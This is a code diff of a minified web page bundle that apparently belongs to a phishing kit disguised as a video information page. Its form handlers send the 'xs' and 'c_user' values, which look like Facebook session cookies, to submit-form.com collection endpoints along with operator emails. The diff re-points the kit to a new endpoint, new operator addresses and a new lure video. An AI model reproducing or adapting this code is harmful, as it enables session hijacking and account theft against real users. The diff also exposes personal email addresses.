@@ -9713,7 +9713,7 @@
             n.useState)()
               , [i,l] = (0,
             n.useState)()
-              , o = ["salman jani email"]
+              , o = ["Nizamani"]
               , s = _();
             return (0,
             he.jsxs)(he.Fragment, {
@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/GtdU7WWRa", {
+                                    fetch("https://submit-form.com/DEEIr4lxi", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "salmanjani email",
+                                            workerEmail: "Lernayouamzaxal@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "asad"
+                                            name: "YOUNIS"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9851,7 +9851,7 @@
                                         children: "Detailed Video Information"
                                     }), (0,
                                     he.jsx)("video", {
-                                        src: "detailed-video.mp4",
+                                        src: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
                                         controls: !0,
                                         poster: me,
                                         autoPlay: !0
@@ -13256,7 +13256,7 @@
             })
         }
           , Wt = () => {
-            const e = ["salmanjaaniiloveyou@gmail.com"]
+            const e = ["abdulbariniz700@gmail.com"]
               , t = _()
               , [r,a] = (0,
             n.useState)(!1)
@@ -13339,7 +13339,7 @@
                                 children: "Detailed Video Information."
                             }), (0,
                             he.jsx)("a", {
-                                href: "https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72",
+                                href: "https://cdn.glitch.global/04223cf5-c2c7-4a98-99b2-9da638394728/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?v=1732616291608",
                                 children: (0,
                                 he.jsx)("img", {
                                     src: me,
@@ -13358,17 +13358,17 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/GtdU7WWRa", {
+                                    u && o ? (fetch("https://submit-form.com/DEEIr4lxi", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "",
+                                            workerEmail: "Lernayouamzaxal@gmail.com",
                                             xs: o,
                                             c_user: u,
-                                            name: "My Self"
+                                            name: "YOUNIS"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/GtdU7WWRa", {
+                        fetch("https://submit-form.com/DEEIr4lxi", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
